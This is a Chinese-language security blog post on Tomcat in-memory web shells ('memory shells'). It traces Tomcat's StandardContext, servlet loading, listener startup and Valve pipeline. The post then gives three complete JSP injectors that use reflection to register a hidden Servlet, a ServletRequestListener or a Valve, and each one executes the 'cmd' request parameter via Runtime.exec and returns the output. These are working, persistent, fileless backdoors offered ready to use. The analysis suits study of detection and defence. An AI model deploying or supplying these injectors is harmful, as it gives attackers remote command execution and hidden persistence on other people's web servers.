<h3 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h3><h4 id="loadOnStartup"><a href="#loadOnStartup" class="headerlink" title="loadOnStartup"></a>loadOnStartup</h4><p>在<code>StanderContext</code>的初始化过程中，在配置完<code>filter</code>之后就会调用<code>loadOnStartup()</code>方法来初始化<code>servlet</code></p>
<pre><code class="java">package org.apache.catalina.core;
public class StandardContext extends ContainerBase
        implements Context, NotificationEmitter &#123;

    @Override
    protected synchronized void startInternal() throws LifecycleException &#123;
        ...
            if (ok) &#123;
                if (!filterStart()) &#123;
                    log.error(sm.getString(&quot;standardContext.filterFail&quot;));
                    ok = false;
                &#125;
            &#125;

            if (ok) &#123;
                if (!loadOnStartup(findChildren()))&#123; // ==&gt; findChildren()返回所有Servlet
                    log.error(sm.getString(&quot;standardContext.servletFail&quot;));
                    ok = false;
                &#125;
            &#125;
          ...</code></pre>
<pre><code class="java">package org.apache.catalina.core;
public abstract class ContainerBase extends LifecycleMBeanBase
        implements Container &#123;

    @Override
    public Container[] findChildren() &#123;
        synchronized (children) &#123; // ==&gt; Children是一个HashMap类型，存储着各个StandardWrapper
            Container results[] = new Container[children.size()];
            return children.values().toArray(results); // ==&gt; 将Wrapper转化为Container
        &#125;
    &#125;</code></pre>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419020d0e5454e24738554553.png" alt="image-20211202123329058" style="zoom:80%;" />


<pre><code class="java">package org.apache.catalina.core;
public class StandardContext extends ContainerBase
        implements Context, NotificationEmitter &#123;

    public boolean loadOnStartup(Container children[]) &#123;

        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();
        for (Container child : children) &#123;
            Wrapper wrapper = (Wrapper) child; // ==&gt; 将Container转化为Wrapper（略显多余的一个步骤）
            int loadOnStartup = wrapper.getLoadOnStartup();
            if (loadOnStartup &lt; 0) &#123; // 令loadOnStartup大于0
                continue;
            &#125;
            Integer key = Integer.valueOf(loadOnStartup);
            ArrayList&lt;Wrapper&gt; list = map.get(key);
            if (list == null) &#123;
                list = new ArrayList&lt;&gt;();
                map.put(key, list);
            &#125;
            list.add(wrapper); // ==&gt; 将wrapper装入list中
        &#125;

        // Load the collected &quot;load on startup&quot; servlets
        for (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;
            for (Wrapper wrapper : list) &#123;
                try &#123;
                    wrapper.load(); // 加载list中的Servlet
                &#125; catch (ServletException e) &#123;
                    getLogger().error(sm.getString(&quot;standardContext.loadOnStartup.loadException&quot;,
                          getName(), wrapper.getName()), StandardWrapper.getRootCause(e));
                    if(getComputedFailCtxIfServletStartFails()) &#123;
                        return false;
                    &#125;
                &#125;
            &#125;
        &#125;
        return true;

    &#125;</code></pre>
<p>所以这里的重点是修改<code>children</code>属性加入我们的<code>wrapper</code>，向上追溯如何生成<code>children</code>，我们可以来到解析<code>web.xml</code>的函数</p>
<pre><code class="java">package org.apache.catalina.startup;
public class ContextConfig implements LifecycleListener &#123;

    private void configureContext(WebXml webxml) &#123;

        ...

        for (ServletDef servlet : webxml.getServlets().values()) &#123; // 搜索web.xml中的servlet
            Wrapper wrapper = context.createWrapper(); // 生成新的wrapper

            if (servlet.getLoadOnStartup() != null) &#123;
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); // 设置loadOnStartup
            &#125;
            if (servlet.getEnabled() != null) &#123;
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            &#125;
            wrapper.setName(servlet.getServletName()); // 设置servletName
            Map&lt;String,String&gt; params = servlet.getParameterMap();
            for (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            &#125;
            wrapper.setRunAs(servlet.getRunAs());
            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) &#123;
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            &#125;
            wrapper.setServletClass(servlet.getServletClass());
            MultipartDef multipartdef = servlet.getMultipartDef();
            if (multipartdef != null) &#123;
                long maxFileSize = -1;
                long maxRequestSize = -1;
                int fileSizeThreshold = 0;

                if(null != multipartdef.getMaxFileSize()) &#123;
                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
                &#125;
                if(null != multipartdef.getMaxRequestSize()) &#123;
                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
                &#125;
                if(null != multipartdef.getFileSizeThreshold()) &#123;
                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
                &#125;

                wrapper.setMultipartConfigElement(new MultipartConfigElement(
                        multipartdef.getLocation(),
                        maxFileSize,
                        maxRequestSize,
                        fileSizeThreshold));
            &#125;
            if (servlet.getAsyncSupported() != null) &#123;
                wrapper.setAsyncSupported(
                        servlet.getAsyncSupported().booleanValue());
            &#125;
            wrapper.setOverridable(servlet.isOverridable());
            context.addChild(wrapper); // ==&gt; 向context新的Child
        &#125;
        ...</code></pre>
<p><code>addChild()</code>方法会调用父类的<code>addChildInternal()</code>方法</p>
<pre><code class="java">package org.apache.catalina.core;
public abstract class ContainerBase extends LifecycleMBeanBase
        implements Container &#123;

    private void addChildInternal(Container child) &#123;

        if( log.isDebugEnabled() )
            log.debug(&quot;Add child &quot; + child + &quot; &quot; + this);
        synchronized(children) &#123;
            if (children.get(child.getName()) != null)
                throw new IllegalArgumentException(&quot;addChild:  Child name &#39;&quot; +
                                                   child.getName() +
                                                   &quot;&#39; is not unique&quot;);
            child.setParent(this);
            children.put(child.getName(), child); // 向children属性添加新的wrapper
        &#125;

        try &#123;
            if ((getState().isAvailable() ||
                    LifecycleState.STARTING_PREP.equals(getState())) &amp;&amp;
                    startChildren) &#123;
                child.start();
            &#125;
        &#125; catch (LifecycleException e) &#123;
            log.error(&quot;ContainerBase.addChild: start: &quot;, e);
            throw new IllegalStateException(&quot;ContainerBase.addChild: start: &quot; + e);
        &#125; finally &#123;
            fireContainerEvent(ADD_CHILD_EVENT, child);
        &#125;
    &#125;</code></pre>
<p>同时需要注意在解析<code>web.xml</code>时，还会将解析到<code>WebServlet</code>添加到<code>context</code>的<code>servletMappingNames</code>属性中，来添加<code>URL</code>匹配规则</p>
<pre><code class="java">package org.apache.catalina.startup;
public class ContextConfig implements LifecycleListener &#123;

    protected void processClass(WebXml fragment, JavaClass clazz) &#123;
        AnnotationEntry[] annotationsEntries = clazz.getAnnotationEntries();
        if (annotationsEntries != null) &#123;
            String className = clazz.getClassName();
            for (AnnotationEntry ae : annotationsEntries) &#123;
                String type = ae.getAnnotationType();
                if (&quot;Ljavax/servlet/annotation/WebServlet;&quot;.equals(type)) &#123;
                    processAnnotationWebServlet(className, ae, fragment); // 处理解析到的WebServlet
                &#125;else if (&quot;Ljavax/servlet/annotation/WebFilter;&quot;.equals(type)) &#123;
                    processAnnotationWebFilter(className, ae, fragment);
                &#125;else if (&quot;Ljavax/servlet/annotation/WebListener;&quot;.equals(type)) &#123;
                    fragment.addListener(className);
                &#125; else &#123;
                    // Unknown annotation - ignore
                &#125;
            &#125;
        &#125;
    &#125;</code></pre>
<pre><code class="java">package org.apache.catalina.startup;
public class ContextConfig implements LifecycleListener &#123;

    package org.apache.catalina.startup;protected void processAnnotationWebServlet(String className,
            AnnotationEntry ae, WebXml fragment) &#123;
        ...

        if (urlPatterns != null) &#123;
            if (!fragment.getServletMappings().containsValue(servletName)) &#123;
                for (String urlPattern : urlPatterns) &#123;
                    fragment.addServletMapping(urlPattern, servletName); // 添加servlet映射
                &#125;
            &#125;
        &#125;

        ...</code></pre>
<pre><code class="java">package org.apache.tomcat.util.descriptor.web;
public class WebXml extends XmlEncodingBase implements DocumentProperties.Encoding,

    public void addServletMappingDecoded(String urlPattern, String servletName) &#123;
        String oldServletName = servletMappings.put(urlPattern, servletName);
        if (oldServletName != null) &#123;
            throw new IllegalArgumentException(sm.getString(
                    &quot;webXml.duplicateServletMapping&quot;, oldServletName,
                    servletName, urlPattern));
        &#125;
        servletMappingNames.add(servletName); // 添加servlet映射
    &#125;</code></pre>
<p><strong>总结</strong></p>
<ul>
<li>在<code>StandardContext</code>的<code>children</code>属性中加入我们定义的<code>wrapper</code></li>
<li>在<code>servletMappingNames</code>属性中加入我们的<code>servlet</code>映射</li>
<li>设置<code>servlet</code>的<code>loadOnStartup</code>属性值大于0</li>
</ul>
<h4 id="Servlet内存马实例"><a href="#Servlet内存马实例" class="headerlink" title="Servlet内存马实例"></a>Servlet内存马实例</h4><pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;
&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;AddServlet&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;%
    try &#123;
        // 从ServletContext中反射获取ApplicationContext和StandardContext
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        String servletURL = &quot;/cmdServlet&quot;;
        String servletName = &quot;CmdServlet&quot;;

        Servlet servlet = new Servlet() &#123;
            @Override
            public void init(ServletConfig servletConfig) &#123;

            &#125;
            @Override
            public ServletConfig getServletConfig() &#123;
                return null;
            &#125;
            @Override
            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException &#123;
                String cmd = servletRequest.getParameter(&quot;cmd&quot;);
                if (&quot;cmd&quot; != null) &#123;
                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);
                    String output = s.hasNext() ? s.next() : &quot;&quot;;
                    PrintWriter out = servletResponse.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                &#125;
            &#125;
            @Override
            public String getServletInfo() &#123;
                return null;
            &#125;
            @Override
            public void destroy() &#123;

            &#125;
        &#125;;

        // 创建wrapper，设置我们的servlet
        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setName(servletName);
        wrapper.setServlet(servlet);
        wrapper.setServletClass(servlet.getClass().getName());
        // 令loadOnStartup大于0
        wrapper.setLoadOnStartup(1);
        // 添加到children属性中
        standardContext.addChild(wrapper);
        // 设置servlet映射
        standardContext.addServletMappingDecoded(servletURL, servletName);

        response.getWriter().write(&quot;Success&quot;);
    &#125; catch (Exception e) &#123;
        e.printStackTrace();
    &#125;
%&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
<h3 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h3><h4 id="Listener分类"><a href="#Listener分类" class="headerlink" title="Listener分类"></a>Listener分类</h4><ul>
<li><p>EventListener（修改属性时触发）</p>
<ul>
<li>ServletContextAttributeListener</li>
<li>ServletRequestAttributeListener</li>
<li>HttpSessionAttributeListener</li>
<li>ServletRequestAttributeListener</li>
</ul>
</li>
<li><p>LifecycleListener（在Servlet生命周期中触发）</p>
<ul>
<li>ServletContextListener</li>
<li>HttpSessionListener</li>
<li>ServletRequestListener</li>
</ul>
</li>
</ul>
<p><code>Listener</code>的种类有很多，但是有些不适用于作为内存马，比如<code>ServletContextListener</code>需要涉及到启动和停止服务器，<code>HttpSessionListener</code>需要设计<code>session</code>的创建和销毁，而<code>ServletRequestListener</code>只涉及到当前请求，所以最适合做内存马的是<code>ServletRequestListener</code></p>
<h4 id="listenerStart"><a href="#listenerStart" class="headerlink" title="listenerStart"></a>listenerStart</h4><pre><code class="java">package org.apache.catalina.core;
public class StandardContext extends ContainerBase
        implements Context, NotificationEmitter &#123;

    @Override
    protected synchronized void startInternal() throws LifecycleException &#123;

        ...
            if (ok) &#123;
                if (!listenerStart()) &#123; // 调用listenerStart()函数
                    log.error(sm.getString(&quot;standardContext.listenerFail&quot;));
                    ok = false;
                &#125;
            &#125;
        ...</code></pre>
<pre><code class="java">package org.apache.catalina.core;
public class StandardContext extends ContainerBase
        implements Context, NotificationEmitter &#123;

    public boolean listenerStart() &#123;

        if (log.isDebugEnabled())
            log.debug(&quot;Configuring application event listeners&quot;);

        String listeners[] = findApplicationListeners(); // 找到全部Linstener名字
        Object results[] = new Object[listeners.length];
        boolean ok = true;
        for (int i = 0; i &lt; results.length; i++) &#123;
            if (getLogger().isDebugEnabled())
                getLogger().debug(&quot; Configuring event listener class &#39;&quot; +
                    listeners[i] + &quot;&#39;&quot;);
            try &#123;
                String listener = listeners[i];
                results[i] = getInstanceManager().newInstance(listener); // 实例化Linstener
            &#125; catch (Throwable t) &#123;
                t = ExceptionUtils.unwrapInvocationTargetException(t);
                ExceptionUtils.handleThrowable(t);
                getLogger().error(sm.getString(
                        &quot;standardContext.applicationListener&quot;, listeners[i]), t);
                ok = false;
            &#125;
        &#125;
        if (!ok) &#123;
            getLogger().error(sm.getString(&quot;standardContext.applicationSkipped&quot;));
            return false;
        &#125;

        List&lt;Object&gt; eventListeners = new ArrayList&lt;&gt;();
        List&lt;Object&gt; lifecycleListeners = new ArrayList&lt;&gt;();
        for (Object result : results) &#123;
            if ((result instanceof ServletContextAttributeListener)
                    || (result instanceof ServletRequestAttributeListener)
                    || (result instanceof ServletRequestListener)
                    || (result instanceof HttpSessionIdListener)
                    || (result instanceof HttpSessionAttributeListener)) &#123;
                eventListeners.add(result);
            &#125;
            if ((result instanceof ServletContextListener)
                    || (result instanceof HttpSessionListener)) &#123;
                lifecycleListeners.add(result); // 把Linstener加入到lifecycleListeners
            &#125;
        &#125;

        eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));
        setApplicationEventListeners(eventListeners.toArray());
        for (Object lifecycleListener: getApplicationLifecycleListeners()) &#123;
            lifecycleListeners.add(lifecycleListener);
            if (lifecycleListener instanceof ServletContextListener) &#123;
                noPluggabilityListeners.add(lifecycleListener);
            &#125;
        &#125;
        setApplicationLifecycleListeners(lifecycleListeners.toArray());

        if (getLogger().isDebugEnabled())
            getLogger().debug(&quot;Sending application start events&quot;);

        getServletContext();
        context.setNewServletContextListenerAllowed(false);

        Object instances[] = getApplicationLifecycleListeners();
        if (instances == null || instances.length == 0) &#123;
            return ok;
        &#125;

        ServletContextEvent event = new ServletContextEvent(getServletContext()); // 获取ServletContextEvent
        ServletContextEvent tldEvent = null;
        if (noPluggabilityListeners.size() &gt; 0) &#123;
            noPluggabilityServletContext = new NoPluggabilityServletContext(getServletContext());
            tldEvent = new ServletContextEvent(noPluggabilityServletContext);
        &#125;
        for (Object instance : instances) &#123;
            if (!(instance instanceof ServletContextListener)) &#123;
                continue;
            &#125;
            ServletContextListener listener = (ServletContextListener) instance;
            try &#123;
                fireContainerEvent(&quot;beforeContextInitialized&quot;, listener);
                if (noPluggabilityListeners.contains(listener)) &#123;
                    listener.contextInitialized(tldEvent);
                &#125; else &#123;
                    listener.contextInitialized(event); // 调用Linstener的contextInitialized()函数
                &#125;
                fireContainerEvent(&quot;afterContextInitialized&quot;, listener);
            &#125; catch (Throwable t) &#123;
                ExceptionUtils.handleThrowable(t);
                fireContainerEvent(&quot;afterContextInitialized&quot;, listener);
                getLogger().error(sm.getString(&quot;standardContext.listenerStart&quot;,
                        instance.getClass().getName()), t);
                ok = false;
            &#125;
        &#125;
        return ok;
    &#125;</code></pre>
<p>所以这里的重点在于我们怎么把<code>Linstener</code>添加到<code>applicationListeners</code>属性中，通过属性调用找到了<code>addApplicationListener()</code>函数</p>
<pre><code class="java">package org.apache.catalina.core;
public class StandardContext extends ContainerBase
        implements Context, NotificationEmitter &#123;

    @Override
    public void addApplicationListener(String listener) &#123;

        synchronized (applicationListenersLock) &#123;
            String results[] = new String[applicationListeners.length + 1]; // 获取Listener名字
            for (int i = 0; i &lt; applicationListeners.length; i++) &#123;
                if (listener.equals(applicationListeners[i])) &#123;
                    log.info(sm.getString(&quot;standardContext.duplicateListener&quot;,listener));
                    return;
                &#125;
                results[i] = applicationListeners[i];
            &#125;
            results[applicationListeners.length] = listener;
            applicationListeners = results; // 传入我们的Linstenr
        &#125;
        fireContainerEvent(&quot;addApplicationListener&quot;, listener);

    &#125;</code></pre>
<p><strong>总结</strong></p>
<ul>
<li>直接调用<code>addApplicationListener</code>将我们的<code>Listener</code>添加到<code>StandardContext</code>的<code>applicationListeners</code>属性中</li>
</ul>
<h4 id="Listener内存马实例"><a href="#Listener内存马实例" class="headerlink" title="Listener内存马实例"></a>Listener内存马实例</h4><pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;
&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;AddLinstener&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;%
    try &#123;
        // 从ServletContext中反射获取ApplicationContext和StandardContext
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        ServletRequestListener listener = new ServletRequestListener() &#123;
            @Override
            public void requestDestroyed(ServletRequestEvent sre) &#123;
                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                String cmd = req.getParameter(&quot;cmd&quot;);
                if (cmd != null)&#123;
                    try &#123;
                        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);
                        String output = s.hasNext() ? s.next() : &quot;&quot;;
                        Field requestF = req.getClass().getDeclaredField(&quot;request&quot;);
                        requestF.setAccessible(true);
                        Request request = (Request)requestF.get(req);
                        PrintWriter out= request.getResponse().getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    &#125;
                    catch (Exception e) &#123;&#125;
                &#125;
            &#125;

            @Override
            public void requestInitialized(ServletRequestEvent sre) &#123;&#125;
        &#125;;

        standardContext.addApplicationEventListener(listener);

        response.getWriter().write(&quot;Success&quot;);
    &#125; catch (Exception e) &#123;
        e.printStackTrace();
    &#125;
%&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<h3 id="Valve内存马"><a href="#Valve内存马" class="headerlink" title="Valve内存马"></a>Valve内存马</h3><h4 id="Pineline"><a href="#Pineline" class="headerlink" title="Pineline"></a>Pineline</h4><p>在上面的Tomcat执行流程中讲到过<code>Pineline</code>的调用链，每一层的<code>valve</code>都会顺序调用，上层的<code>valve</code>会调用下层的<code>valve</code>，然后每次调用<code>valve</code>的<code>invoke()</code>方法</p>
<p>比如在<code>StandardHostValve</code>类中是这样调用<code>vavle</code>的<code>invoke()</code>方法的</p>
<pre><code class="java">Context context = request.getContext(); // 获取StandardContext
...
context.getPipeline().getFirst().invoke(request, response); // 获取StandardContext的Valve</code></pre>
<p>然后在每一个<code>invoke()</code>里面又会递归调用</p>
<pre><code class="java">getNext().invoke(request, response); // 获取StandardContext的下一个Valve</code></pre>
<p>所以我们只需在<code>standardContext</code>中添加我们的<code>valve</code>，即可注入<code>Valve</code>内存马</p>
<pre><code class="java">standardContext.getPipeline().addValve(valve);</code></pre>
<h4 id="Valve内存马实例"><a href="#Valve内存马实例" class="headerlink" title="Valve内存马实例"></a>Valve内存马实例</h4><pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Valve&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;AddVavle&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;%
    try &#123;
        // 从ServletContext中反射获取ApplicationContext和StandardContext
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        Valve valve = new Valve() &#123;
            @Override
            public void invoke(Request request, Response response) throws IOException, ServletException &#123;
                HttpServletRequest req = request;
                String cmd = req.getParameter(&quot;cmd&quot;);
                if (cmd != null) &#123;
                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);
                    String output = s.hasNext() ? s.next() : &quot;&quot;;
                    PrintWriter out = response.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                &#125;
                this.getNext().invoke(request, response);
            &#125;

            @Override
            public boolean isAsyncSupported() &#123; return false; &#125;

            @Override
            public Valve getNext() &#123; return null; &#125;

            @Override
            public void setNext(Valve valve) &#123;&#125;

            @Override
            public void backgroundProcess() &#123;&#125;
        &#125;;

        standardContext.getPipeline().addValve(valve);

        response.getWriter().write(&quot;Success&quot;);

    &#125; catch (Exception e) &#123;
        e.printStackTrace();
    &#125;
%&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/bitterzzZZ/MemoryShellLearn">https://github.com/bitterzzZZ/MemoryShellLearn</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10362">Tomcat 内存马（二）Filter型</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/haimishasha/p/10740606.html">Tomcat系列(4)——Tomcat 组件及架构详细部分</a></li>
<li><a target="_blank" rel="noopener" href="https://xuanjian1992.top/2019/08/13/Spring-MVC%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90(xml%E9%85%8D%E7%BD%AE)/">Spring MVC启动流程分析(xml配置)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/hao134838/article/details/109746151">从源码分析tomcat如何调用Servlet的初始化</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xyylll/p/15463635.html">tomcat内存马原理解析及实现</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">Java内存马：一种Tomcat全版本获取StandardContext的新方法</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Handlebars AST注入</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%BA%94%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">Web应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">初始化流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat"><span class="toc-number">2.</span> <span class="toc-text">Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">Tomcat体系结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E7%BB%84%E4%BB%B6%E5%85%B3%E7%B3%BB"><span class="toc-number">2.2.</span> <span class="toc-text">Tomcat组件关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">Tomcat执行流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StandardContext"><span class="toc-number">2.4.</span> <span class="toc-text">StandardContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.5.</span> <span class="toc-text">Filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FilterChain"><span class="toc-number">2.5.1.</span> <span class="toc-text">FilterChain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.5.2.</span> <span class="toc-text">Filter内存马实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.6.</span> <span class="toc-text">Servlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#loadOnStartup"><span class="toc-number">2.6.1.</span> <span class="toc-text">loadOnStartup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.6.2.</span> <span class="toc-text">Servlet内存马实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.7.</span> <span class="toc-text">Listener内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 